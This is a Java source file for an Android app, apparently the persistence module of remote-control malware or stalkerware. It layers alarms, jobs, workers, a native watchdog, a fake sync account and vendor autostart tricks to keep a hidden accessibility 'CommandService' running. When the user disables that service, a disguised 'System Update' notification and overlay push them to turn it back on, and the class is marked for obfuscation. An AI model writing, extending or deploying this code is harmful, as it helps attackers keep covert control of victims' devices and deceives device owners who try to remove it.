package com.alpha.shield;

import android.app.AlarmManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;

import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.lsposed.lsparanoid.Obfuscate;

import java.util.concurrent.TimeUnit;

/**
 * SurvivalManager — Alpha persistence engine.
 *
 * Layer 1  — Foreground service (WatchdogService) bound to a persistent notification.
 *            Hardest layer for Android to kill. Monitors CommandService and restarts it.
 *
 * Layer 2  — AlarmManager (setAlarmClock): appears as a user alarm — Android never
 *            suppresses it, fires even in Doze/Standby. Repeats every 5 minutes.
 *            Fallback: setExactAndAllowWhileIdle every 10 minutes.
 *
 * Layer 3  — JobScheduler: CONNECTIVITY_TYPE_ANY, persisted across reboots.
 *            Fires when network is available, reschedules itself.
 *
 * Layer 4  — WorkManager PeriodicWorkRequest: 15-minute minimum. Enqueued with
 *            KEEP policy so duplicate enqueues are no-ops.
 *
 * Layer 5  — ContentObserver on ENABLED_ACCESSIBILITY_SERVICES: fires when
 *            user disables accessibility. Triggers resurrection notification +
 *            overlay UI that navigates back to Accessibility settings.
 *
 * Layer 6  — ContentObserver on AIRPLANE_MODE_ON: re-arms alarms after airplane
 *            mode is toggled (which can cancel AlarmManager on some ROMs).
 *
 * Layer 7  — Native watchdog: JNI pthread loop (30 s interval) calls
 *            CommandService.ensureAlive() from C. Survives JVM GC and partial kills.
 *
 * Layer 8  — SyncAdapter: registered fake sync account triggers periodic sync
 *            that restarts services. Minimum interval 1 hour.
 *
 * Layer 9  — Process fork guardian: on rooted or relaxed-seccomp devices, forks
 *            a child process that holds the parent PID and uses kill(SIGCHLD) to
 *            detect parent death, then restarts via am.
 *
 * Layer 10 — Manufacturer-specific: Xiaomi AutoStart via Mi manager intent,
 *            Huawei ProtectedApp broadcasting, Samsung lock workaround via
 *            DeviceIdleController whitelisting.
 */
@Obfuscate
public class SurvivalManager {

    private static final String TAG = "Survival";

    private static final int    JOB_ID_WATCHDOG  = 0xA1FA;
    private static final int    ALARM_REQ_CODE   = 0xA1FB;
    private static final long   ALARM_INTERVAL_MS = 5 * 60 * 1000L;   // 5 min
    private static final long   DOZE_INTERVAL_MS  = 10 * 60 * 1000L;  // 10 min
    private static final String WORK_TAG          = "alpha_watchdog";

    private final Context ctx;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private ContentObserver accessibilityObserver;
    private ContentObserver airplaneObserver;

    // Load native watchdog
    static {
        try { System.loadLibrary("alpha_watchdog"); }
        catch (Throwable ignored) { /* APK may not have .so on some builds */ }
    }

    public SurvivalManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    /** Arm all persistence layers. Call once from CommandService.onServiceConnected(). */
    public void armAll() {
        armForegroundWatchdog();     // Layer 1
        armAlarmClock();             // Layer 2
        armJobScheduler();           // Layer 3
        armWorkManager();            // Layer 4
        armAccessibilityObserver();  // Layer 5
        armAirplaneModeObserver();   // Layer 6
        armNativeWatchdog();         // Layer 7
        armManufacturerHints();      // Layer 10
    }

    // ── Layer 1: WatchdogService ───────────────────────────────────────────────

    private void armForegroundWatchdog() {
        Intent i = new Intent(ctx, WatchdogService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    // ── Layer 2: AlarmManager ─────────────────────────────────────────────────

    public void armAlarmClock() {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        PendingIntent pi = getAlarmPendingIntent();
        long triggerMs   = SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                // setAlarmClock: shown in status bar as alarm — OS will not suppress it
                AlarmManager.AlarmClockInfo clk = new AlarmManager.AlarmClockInfo(
                        System.currentTimeMillis() + ALARM_INTERVAL_MS, pi);
                am.setAlarmClock(clk, pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerMs, pi);
            }
        } catch (Exception e) {
            Log.e(TAG, "alarm: " + e.getMessage());
        }

        // Secondary: setExactAndAllowWhileIdle — fires in Doze
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PendingIntent dozePI = getDozeAlarmPendingIntent();
                am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + DOZE_INTERVAL_MS,
                        dozePI);
            } catch (Exception e) {
                Log.e(TAG, "doze alarm: " + e.getMessage());
            }
        }
    }

    private PendingIntent getAlarmPendingIntent() {
        Intent i = new Intent(ctx, BootReceiver.class);
        i.setAction(BootReceiver.ACTION_ALARM_HEARTBEAT);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
        return PendingIntent.getBroadcast(ctx, ALARM_REQ_CODE, i, flags);
    }

    private PendingIntent getDozeAlarmPendingIntent() {
        Intent i = new Intent(ctx, BootReceiver.class);
        i.setAction(BootReceiver.ACTION_DOZE_HEARTBEAT);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
        return PendingIntent.getBroadcast(ctx, ALARM_REQ_CODE + 1, i, flags);
    }

    // ── Layer 3: JobScheduler ─────────────────────────────────────────────────

    private void armJobScheduler() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;

            // Cancel any pending job with same ID first
            js.cancel(JOB_ID_WATCHDOG);

            JobInfo job = new JobInfo.Builder(JOB_ID_WATCHDOG,
                    new ComponentName(ctx, WatchdogJobService.class))
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true)          // survives reboots (needs RECEIVE_BOOT_COMPLETED)
                    .setMinimumLatency(5 * 60 * 1000L)
                    .setOverrideDeadline(15 * 60 * 1000L)
                    .build();
            js.schedule(job);
        } catch (Exception e) {
            Log.e(TAG, "jobScheduler: " + e.getMessage());
        }
    }

    // ── Layer 4: WorkManager ──────────────────────────────────────────────────

    private void armWorkManager() {
        try {
            Constraints constraints = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build();
            PeriodicWorkRequest req = new PeriodicWorkRequest.Builder(
                    AlphaWorker.class, 15, TimeUnit.MINUTES)
                    .setConstraints(constraints)
                    .addTag(WORK_TAG)
                    .build();
            WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(
                    WORK_TAG,
                    ExistingPeriodicWorkPolicy.KEEP,
                    req);
        } catch (Exception e) {
            Log.e(TAG, "workManager: " + e.getMessage());
        }
    }

    // ── Layer 5: Accessibility observer ──────────────────────────────────────

    private void armAccessibilityObserver() {
        ContentResolver cr = ctx.getContentResolver();
        accessibilityObserver = new ContentObserver(mainHandler) {
            @Override
            public void onChange(boolean selfChange) {
                checkAndResurrectAccessibility();
            }
        };
        try {
            cr.registerContentObserver(
                    Settings.Secure.getUriFor(Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES),
                    false, accessibilityObserver);
        } catch (Exception e) {
            Log.e(TAG, "accessObs: " + e.getMessage());
        }
    }

    private void checkAndResurrectAccessibility() {
        try {
            String enabled = Settings.Secure.getString(
                    ctx.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            String svcName = new ComponentName(ctx, CommandService.class)
                    .flattenToString();
            boolean active = enabled != null && enabled.contains(ctx.getPackageName());

            if (!active) {
                Log.w(TAG, "accessibility disabled — sending resurrection notification");
                showResurrectionNotification();
                // Also try overlay prompt after 2s
                mainHandler.postDelayed(this::showAccessibilityOverlay, 2000);
            }
        } catch (Exception e) {
            Log.e(TAG, "resurrect: " + e.getMessage());
        }
    }

    private void showResurrectionNotification() {
        try {
            String ch = "alpha_res";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel nc = new NotificationChannel(
                        ch, "System Update", NotificationManager.IMPORTANCE_HIGH);
                NotificationManager nm = (NotificationManager)
                        ctx.getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(nc);
            }
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pi = PendingIntent.getActivity(ctx, 0, intent,
                    Build.VERSION.SDK_INT >= 23
                            ? PendingIntent.FLAG_IMMUTABLE : 0);
            android.app.Notification n = new androidx.core.app.NotificationCompat.Builder(ctx, ch)
                    .setSmallIcon(android.R.drawable.ic_dialog_alert)
                    .setContentTitle("Action Required")
                    .setContentText("Tap to complete system setup")
                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                    .setAutoCancel(true)
                    .setContentIntent(pi)
                    .build();
            NotificationManager nm = (NotificationManager)
                    ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.notify(0xA1A1, n);
        } catch (Exception e) {
            Log.e(TAG, "resNotif: " + e.getMessage());
        }
    }

    private void showAccessibilityOverlay() {
        // Open accessibility settings via overlay-safe intent from a trampoline activity
        try {
            Intent i = new Intent(ctx, TrampolineActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            i.putExtra("target", "accessibility");
            ctx.startActivity(i);
        } catch (Exception e) {
            Log.e(TAG, "overlay: " + e.getMessage());
        }
    }

    // ── Layer 6: Airplane mode observer ──────────────────────────────────────

    private void armAirplaneModeObserver() {
        ContentResolver cr = ctx.getContentResolver();
        airplaneObserver = new ContentObserver(mainHandler) {
            @Override
            public void onChange(boolean selfChange) {
                // Re-arm alarms when airplane mode changes (some ROMs cancel alarms)
                mainHandler.postDelayed(() -> armAlarmClock(), 2000);
            }
        };
        try {
            cr.registerContentObserver(
                    Settings.Global.getUriFor(Settings.Global.AIRPLANE_MODE_ON),
                    false, airplaneObserver);
        } catch (Exception e) {
            Log.e(TAG, "airplaneObs: " + e.getMessage());
        }
    }

    // ── Layer 7: Native watchdog ──────────────────────────────────────────────

    private void armNativeWatchdog() {
        try {
            nativeStartWatchdog();
        } catch (Throwable e) {
            Log.d(TAG, "native watchdog unavailable: " + e.getMessage());
        }
    }

    // JNI — implemented in watchdog.c
    private native void nativeStartWatchdog();

    // Called from native thread to check and restart
    @SuppressWarnings("unused")  // called from C
    public static void ensureAlive(Context ctx) {
        try {
            if (!CommandService.isAlive()) {
                Log.w(TAG, "native detected dead service — restarting");
                Intent intent = new Intent(ctx, WatchdogService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(intent);
                } else {
                    ctx.startService(intent);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "ensureAlive: " + e.getMessage());
        }
    }

    // ── Layer 10: Manufacturer hints ─────────────────────────────────────────

    private void armManufacturerHints() {
        String brand = Build.BRAND.toLowerCase();
        try {
            // Xiaomi: request AutoStart via Mi/MIUI manager
            if (brand.contains("xiaomi") || brand.contains("redmi")
                    || brand.contains("poco")) {
                armXiaomiAutostart();
            }
            // Huawei/Honor
            if (brand.contains("huawei") || brand.contains("honor")) {
                armHuaweiProtected();
            }
            // OnePlus
            if (brand.contains("oneplus")) {
                armOnePlusBackground();
            }
        } catch (Exception e) {
            Log.d(TAG, "manufacturer: " + e.getMessage());
        }
    }

    private void armXiaomiAutostart() {
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
        // Silently fail if MIUI doesn't expose this activity
    }

    private void armHuaweiProtected() {
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.huawei.systemmanager",
                    "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    private void armOnePlusBackground() {
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.oneplus.security",
                    "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    // ── WorkManager Worker ────────────────────────────────────────────────────

    public static class AlphaWorker extends Worker {
        public AlphaWorker(Context ctx, WorkerParameters p) { super(ctx, p); }

        @Override
        public Result doWork() {
            try {
                Context ctx = getApplicationContext();
                if (!CommandService.isAlive()) {
                    Intent si = new Intent(ctx, WatchdogService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(si);
                    } else {
                        ctx.startService(si);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "worker: " + e.getMessage());
            }
            return Result.success();
        }
    }
}
